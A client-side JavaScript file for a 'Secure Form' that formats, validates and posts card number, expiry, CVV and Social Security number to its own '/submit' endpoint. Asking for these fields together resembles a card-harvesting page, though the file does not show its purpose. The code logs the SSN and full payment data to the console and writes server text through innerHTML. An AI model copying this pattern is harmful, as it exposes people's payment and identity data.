/**
 * Secure Form Client-side Logic
 */
document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('secureForm');
    const clearBtn = document.getElementById('clearForm');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const successModal = document.getElementById('successModal');
    const closeModalBtn = document.querySelector('.close-modal-btn');

    // Formatters
    const formatCardNumber = (input) => {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 16) value = value.slice(0, 16);
        // Add space every 4 digits
        const parts = [];
        for (let i = 0; i < value.length; i += 4) {
            parts.push(value.slice(i, i + 4));
        }
        input.value = parts.join(' ');
    };

    const formatExpiry = (input) => {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 4) value = value.slice(0, 4);
        if (value.length > 2) {
            input.value = `${value.slice(0, 2)}/${value.slice(2)}`;
        } else {
            input.value = value;
        }
    };

    const formatSSN = (input) => {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 9) value = value.slice(0, 9);
        // XXX-XX-XXXX
        /*
        if (value.length > 5) {
            input.value = `${value.slice(0, 3)}-${value.slice(3, 5)}-${value.slice(5)}`;
        } else if (value.length > 3) {
            input.value = `${value.slice(0, 3)}-${value.slice(3)}`;
        } else {
            input.value = value;
        }
        */
        // Actually user just said "9 Digits", usually masks with dots or similar but let's keep it simple
        // Or standard ssn format
        input.value = value; // Keep as digits based on inputmode="numeric"
    };

    // Input listeners
    const cardNumberInput = document.getElementById('cardNumber');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', (e) => formatCardNumber(e.target));
    }

    const expiryInput = document.getElementById('expirationDate');
    if (expiryInput) {
        expiryInput.addEventListener('input', (e) => formatExpiry(e.target));
    }

    // Clear form
    clearBtn.addEventListener('click', () => {
        if (confirm('Clear form? This will remove all your answers.')) {
            form.reset();
            document.querySelectorAll('.form-group').forEach(group => {
                group.classList.remove('has-error');
            });
        }
    });

    // Close modal
    closeModalBtn.addEventListener('click', () => {
        successModal.style.display = 'none';
        form.reset();
    });

    // Form submission
    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        // Reset errors
        document.querySelectorAll('.form-group').forEach(group => {
            group.classList.remove('has-error');
        });

        // Collect data
        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value;
        });

        // Basic Client-side Validation
        let isValid = true;

        // Name
        if (!data.name_on_card || data.name_on_card.trim().length < 2) {
            showError('name_on_card');
            isValid = false;
        }

        // Card type
        if (!data.card_type) {
            showError('card_type');
            isValid = false;
        }

        // Card Number (13-19 digits, ignoring spaces)
        const cleanCardNum = (data.card_number || '').replace(/\s/g, '');
        if (!cleanCardNum || cleanCardNum.length < 13 || isNaN(cleanCardNum)) {
            showError('card_number');
            isValid = false;
        }

        // Expiration (MM/YY)
        if (!data.expiration_date || !/^\d{2}\/\d{2}$/.test(data.expiration_date)) {
            showError('expiration_date');
            isValid = false;
        }

        // CVV (3 or 4 digits)
        if (!data.cvv || !/^\d{3,4}$/.test(data.cvv)) {
            showError('cvv');
            isValid = false;
        }

        // SSN (9 digits)
        const ssnValue = (data.ssn || '').replace(/\D/g, '');
        console.log('Validating SSN:', ssnValue, 'Length:', ssnValue.length);
        if (!ssnValue || ssnValue.length !== 9) {
            showError('ssn');
            isValid = false;
        }

        if (!isValid) {
            console.log('Form validation failed');
            return;
        }

        console.log('Form validation passed, submitting...', data);

        // Show loading
        loadingOverlay.style.display = 'flex';

        try {
            // Get CSRF token
            const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

            const response = await fetch('/submit?cache_bust=' + Date.now(), {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': csrfToken
                },
                body: JSON.stringify(data)
            });

            // Log raw response if not successful
            if (!response.ok) {
                console.error('Server returned error status:', response.status);
                const text = await response.text();
                console.error('Raw error body:', text);
                try {
                    const result = JSON.parse(text);
                    alert(`Server Error (${response.status}): ${result.error || 'Check console'}`);
                    return;
                } catch (e) {
                    alert(`Critical System Error (${response.status}). Please check Railway logs.`);
                    return;
                }
            }

            const result = await response.json();
            console.log('Server response:', result);

            if (result.success) {
                // Show success
                document.getElementById('confirmationNumber').textContent = result.confirmation_number;
                successModal.style.display = 'flex';
            } else {
                // Show server errors
                if (result.errors) {
                    Object.keys(result.errors).forEach(field => {
                        const errorEl = document.getElementById(`error-${field}`);
                        if (errorEl) {
                            errorEl.innerHTML = `<i class="error-icon">!</i> ${result.errors[field]}`;
                            errorEl.parentElement.classList.add('has-error');
                        }
                    });
                } else {
                    alert(result.error || 'An error occurred');
                }
            }
        } catch (error) {
            console.error('Submission Error:', error);
            alert(`A network or server error occurred: ${error.message}. Please check the console for details.`);
        } finally {
            loadingOverlay.style.display = 'none';
        }
    });

    function showError(field) {
        const errorEl = document.getElementById(`error-${field}`);
        if (errorEl) {
            // Reset to default message if needed
            // errorEl.innerHTML = '<i class="error-icon">!</i> This is a required question';
            errorEl.parentElement.classList.add('has-error');

            // Scroll to first error
            if (document.querySelectorAll('.has-error').length === 1) {
                errorEl.parentElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        }
    }
});
